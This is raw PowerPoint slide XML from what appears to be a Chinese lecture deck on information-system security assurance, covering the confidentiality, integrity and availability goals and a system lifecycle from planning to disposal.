                  <a:gd name="T3" fmla="*/ 0 h 1566"/>
                  <a:gd name="T4" fmla="*/ 389 w 389"/>
                  <a:gd name="T5" fmla="*/ 1332 h 1566"/>
                  <a:gd name="T6" fmla="*/ 0 w 389"/>
                  <a:gd name="T7" fmla="*/ 1566 h 1566"/>
                  <a:gd name="T8" fmla="*/ 0 w 389"/>
                  <a:gd name="T9" fmla="*/ 234 h 1566"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="389" h="1566">
                    <a:moveTo>
                      <a:pt x="0" y="234"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="389" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="389" y="1332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1566"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="234"/>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4" name="Group 73"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3647" y="998"/>
              <a:ext cx="1127" cy="1130"/>
              <a:chOff x="3647" y="998"/>
              <a:chExt cx="1127" cy="1130"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="77" name="Freeform 71"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3647" y="998"/>
                <a:ext cx="1127" cy="1130"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 1127"/>
                  <a:gd name="T1" fmla="*/ 644 h 1130"/>
                  <a:gd name="T2" fmla="*/ 1127 w 1127"/>
                  <a:gd name="T3" fmla="*/ 0 h 1130"/>
                  <a:gd name="T4" fmla="*/ 1127 w 1127"/>
                  <a:gd name="T5" fmla="*/ 486 h 1130"/>
                  <a:gd name="T6" fmla="*/ 0 w 1127"/>
                  <a:gd name="T7" fmla="*/ 1130 h 1130"/>
                  <a:gd name="T8" fmla="*/ 0 w 1127"/>
                  <a:gd name="T9" fmla="*/ 644 h 1130"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="1127" h="1130">
                    <a:moveTo>
                      <a:pt x="0" y="644"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="1127" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1127" y="486"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="64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72"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3647" y="998"/>
                <a:ext cx="1127" cy="1130"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 1127"/>
                  <a:gd name="T1" fmla="*/ 644 h 1130"/>
                  <a:gd name="T2" fmla="*/ 1127 w 1127"/>
                  <a:gd name="T3" fmla="*/ 0 h 1130"/>
                  <a:gd name="T4" fmla="*/ 1127 w 1127"/>
                  <a:gd name="T5" fmla="*/ 486 h 1130"/>
                  <a:gd name="T6" fmla="*/ 0 w 1127"/>
                  <a:gd name="T7" fmla="*/ 1130 h 1130"/>
                  <a:gd name="T8" fmla="*/ 0 w 1127"/>
                  <a:gd name="T9" fmla="*/ 644 h 1130"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="1127" h="1130">
                    <a:moveTo>
                      <a:pt x="0" y="644"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="1127" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1127" y="486"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="644"/>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55" name="Line 74"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="3658" y="1633"/>
              <a:ext cx="0" cy="1799"/>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Line 75"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="3658" y="2745"/>
              <a:ext cx="1116" cy="688"/>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76"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3900" y="1053"/>
              <a:ext cx="378" cy="303"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 286 w 378"/>
                <a:gd name="T1" fmla="*/ 0 h 303"/>
                <a:gd name="T2" fmla="*/ 0 w 378"/>
                <a:gd name="T3" fmla="*/ 165 h 303"/>
                <a:gd name="T4" fmla="*/ 92 w 378"/>
                <a:gd name="T5" fmla="*/ 303 h 303"/>
                <a:gd name="T6" fmla="*/ 378 w 378"/>
                <a:gd name="T7" fmla="*/ 138 h 303"/>
                <a:gd name="T8" fmla="*/ 286 w 378"/>
                <a:gd name="T9" fmla="*/ 0 h 303"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="0" t="0" r="r" b="b"/>
              <a:pathLst>
                <a:path w="378" h="303">
                  <a:moveTo>
                    <a:pt x="286" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="303"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="378" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28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Rectangle 77"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3480000">
              <a:off x="4075" y="1172"/>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废</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9" name="Rectangle 78"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3480000">
              <a:off x="3971" y="1213"/>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弃</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0" name="Line 79"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="4774" y="998"/>
              <a:ext cx="0" cy="1747"/>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Rectangle 80"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3848" y="2349"/>
              <a:ext cx="105"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300" b="1"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机</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2" name="Rectangle 81"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3848" y="2477"/>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密</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3" name="Rectangle 82"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3848" y="2606"/>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性</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4" name="Rectangle 83"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="19500000">
              <a:off x="3929" y="1532"/>
              <a:ext cx="390"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700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                  <a:ln>
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:effectLst/>
                  <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>安全特征</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5" name="Freeform 84"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1795" y="998"/>
              <a:ext cx="649" cy="479"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 528 w 649"/>
                <a:gd name="T1" fmla="*/ 0 h 479"/>
                <a:gd name="T2" fmla="*/ 0 w 649"/>
                <a:gd name="T3" fmla="*/ 292 h 479"/>
                <a:gd name="T4" fmla="*/ 121 w 649"/>
                <a:gd name="T5" fmla="*/ 479 h 479"/>
                <a:gd name="T6" fmla="*/ 649 w 649"/>
                <a:gd name="T7" fmla="*/ 188 h 479"/>
                <a:gd name="T8" fmla="*/ 528 w 649"/>
                <a:gd name="T9" fmla="*/ 0 h 479"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="0" t="0" r="r" b="b"/>
              <a:pathLst>
                <a:path w="649" h="479">
                  <a:moveTo>
                    <a:pt x="528" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="479"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="649" y="188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5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Rectangle 85"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="2222" y="1088"/>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计</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7" name="Rectangle 86"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="2104" y="1154"/>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划</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8" name="Rectangle 87"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="1969" y="1247"/>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组</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9" name="Rectangle 88"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="1865" y="1285"/>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织</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70" name="Group 91"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1160" y="1475"/>
              <a:ext cx="2775" cy="158"/>
              <a:chOff x="1160" y="1475"/>
              <a:chExt cx="2775" cy="158"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="75" name="Freeform 89"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="1475"/>
                <a:ext cx="2775" cy="158"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 287 w 2775"/>
                  <a:gd name="T1" fmla="*/ 0 h 158"/>
                  <a:gd name="T2" fmla="*/ 0 w 2775"/>
                  <a:gd name="T3" fmla="*/ 158 h 158"/>
                  <a:gd name="T4" fmla="*/ 2487 w 2775"/>
                  <a:gd name="T5" fmla="*/ 158 h 158"/>
                  <a:gd name="T6" fmla="*/ 2775 w 2775"/>
                  <a:gd name="T7" fmla="*/ 0 h 158"/>
                  <a:gd name="T8" fmla="*/ 287 w 2775"/>
                  <a:gd name="T9" fmla="*/ 0 h 158"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="2775" h="158">
                    <a:moveTo>
                      <a:pt x="287" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="158"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2487" y="158"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2775" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2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90"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="1475"/>
                <a:ext cx="2775" cy="158"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 287 w 2775"/>
                  <a:gd name="T1" fmla="*/ 0 h 158"/>
                  <a:gd name="T2" fmla="*/ 0 w 2775"/>
                  <a:gd name="T3" fmla="*/ 158 h 158"/>
                  <a:gd name="T4" fmla="*/ 2487 w 2775"/>
                  <a:gd name="T5" fmla="*/ 158 h 158"/>
                  <a:gd name="T6" fmla="*/ 2775 w 2775"/>
                  <a:gd name="T7" fmla="*/ 0 h 158"/>
                  <a:gd name="T8" fmla="*/ 287 w 2775"/>
                  <a:gd name="T9" fmla="*/ 0 h 158"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="2775" h="158">
                    <a:moveTo>
                      <a:pt x="287" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="158"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2487" y="158"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2775" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287"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71" name="Rectangle 92"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2249" y="1496"/>
              <a:ext cx="390"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700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                  <a:ln>
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:effectLst/>
                  <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>生命周期</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2" name="Line 93"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="1160" y="998"/>
              <a:ext cx="1115" cy="635"/>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Line 94"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2275" y="998"/>
              <a:ext cx="2499" cy="0"/>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Line 95"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="3658" y="998"/>
              <a:ext cx="1116" cy="635"/>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4" name="文本框 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B98F7937-0F24-034D-BCC9-9CFF89EF2593}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4742518" y="1090709"/>
            <a:ext cx="3801041" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>像大创开题</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>中期</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>结题，有过程管理</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17099583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Rot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="755649"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mj-ea"/>
              </a:rPr>
              <a:t>信息系统安全保障</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mj-ea"/>
              </a:rPr>
              <a:t>安全特征</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mj-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64516" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1567506"/>
            <a:ext cx="8280920" cy="141352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kern="1200" dirty="0"/>
              <a:t>确保信息的安全特征</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>确保信息的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>机密性、完整性和可用性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>特征，从而实现和贯彻组织机构策略并将风险降低到可接受的程度</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="3110654"/>
            <a:ext cx="7704856" cy="966418"/>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保护资产</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>达到保护组织机构信息和信息系统资产</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="4293096"/>
            <a:ext cx="7848872" cy="966418"/>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最终保障业务使命</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>从而保障组织机构实现其业务使命的最终目的 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11187658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4516">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6451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451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4516">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4516">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="64516">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64516">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64516">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build="p"/>
      <p:bldP spid="2" grpId="0"/>
      <p:bldP spid="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五边形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="309312" y="3140968"/>
            <a:ext cx="1296144" cy="576064"/>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t>计划组织</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="燕尾形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1461440" y="3140968"/>
            <a:ext cx="1728192" cy="576064"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>开发采购</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="燕尾形 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3045616" y="3140968"/>
            <a:ext cx="1728192" cy="576064"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>实施交互</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="燕尾形 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4629792" y="3140968"/>
            <a:ext cx="1728192" cy="576064"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>运行维护</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="燕尾形 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6213968" y="3140968"/>
